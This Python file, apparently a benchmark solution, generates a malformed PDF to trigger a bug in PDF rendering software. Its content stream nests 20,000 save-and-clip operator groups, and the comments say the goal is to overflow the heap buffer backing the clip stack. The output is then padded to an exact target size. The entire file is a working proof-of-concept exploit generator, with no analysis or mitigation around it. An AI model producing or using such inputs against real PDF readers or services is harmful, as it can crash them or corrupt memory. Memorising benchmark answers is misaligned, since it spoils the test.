import os
import struct
import zlib
import tempfile
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a PDF file that deeply nests clip marks
        # Structure based on typical PDF clip operator usage
        
        # PDF header
        pdf_content = []
        pdf_content.append(b"%PDF-1.4")
        
        # Catalog
        catalog_obj = b"""
1 0 obj
<<
/Type /Catalog
/Pages 2 0 R
>>
endobj
"""
        pdf_content.append(catalog_obj.strip())
        
        # Pages tree
        pages_obj = b"""
2 0 obj
<<
/Type /Pages
/Kids [3 0 R]
/Count 1
>>
endobj
"""
        pdf_content.append(pages_obj.strip())
        
        # Create deeply nested clip operations
        # Each clip operation pushes onto the clip stack
        # We'll create enough nesting to overflow the heap buffer
        
        # Generate a very deep sequence of q/W/Q operations
        # q = save graphics state, W = clip, Q = restore graphics state
        # We'll nest them deeply to overflow the clip stack
        
        content = []
        content.append(b"q\n")  # Initial save
        
        # Add many nested clip operations
        # Each level adds more nesting depth
        for i in range(20000):  # Large enough to cause overflow
            # Define a clipping path
            content.append(b"0 0 100 100 re\n")  # rectangle
            content.append(b"W\n")  # clip
            content.append(b"q\n")  # save for next level
        
        # Add corresponding restores
        for i in range(20000):
            content.append(b"Q\n")  # restore
        
        content.append(b"Q\n")  # Final restore
        
        content_stream = b"".join(content)
        
        # Compress the content stream
        compressed = zlib.compress(content_stream)
        
        # Page object with compressed stream
        page_obj = f"""
3 0 obj
<<
/Type /Page
/Parent 2 0 R
/MediaBox [0 0 612 792]
/Contents 4 0 R
>>
endobj
""".strip().encode()
        pdf_content.append(page_obj)
        
        # Content stream object
        stream_obj = f"""
4 0 obj
<<
/Length {len(compressed)}
/Filter /FlateDecode
>>
stream
""".strip().encode() + b"\n" + compressed + b"\nendstream\nendobj"
        pdf_content.append(stream_obj)
        
        # Cross-reference table
        xref_start = len(b"\n".join(pdf_content))
        
        xref = []
        xref.append(b"xref")
        xref.append(b"0 5")
        xref.append(b"0000000000 65535 f")
        xref.append(b"0000000010 00000 n")
        xref.append(b"0000000059 00000 n")
        xref.append(b"0000000118 00000 n")
        xref.append(b"0000000250 00000 n")
        
        # Calculate offsets properly
        offsets = []
        current = 0
        for chunk in pdf_content:
            offsets.append(current)
            current += len(chunk) + 1  # +1 for newline
        
        # Update xref with proper offsets
        xref = []
        xref.append(b"xref")
        xref.append(b"0 5")
        xref.append(f"{offsets[0]:010d} 65535 f".encode())
        for i in range(1, 5):
            xref.append(f"{offsets[i]:010d} 00000 n".encode())
        
        pdf_content.extend(xref)
        
        # Trailer
        trailer = f"""
trailer
<<
/Size 5
/Root 1 0 R
>>
startxref
{xref_start}
%%EOF
""".strip().encode()
        pdf_content.append(trailer)
        
        # Join all parts with newlines
        pdf_bytes = b"\n".join(pdf_content)
        
        # If needed, pad to target size while maintaining PDF validity
        target_size = 825339
        if len(pdf_bytes) < target_size:
            # Add comments to pad the file
            padding = b"\n% " + b"P" * (target_size - len(pdf_bytes) - 3)
            pdf_bytes = pdf_bytes + padding
        
        return pdf_bytes[:target_size]  # Ensure exact target size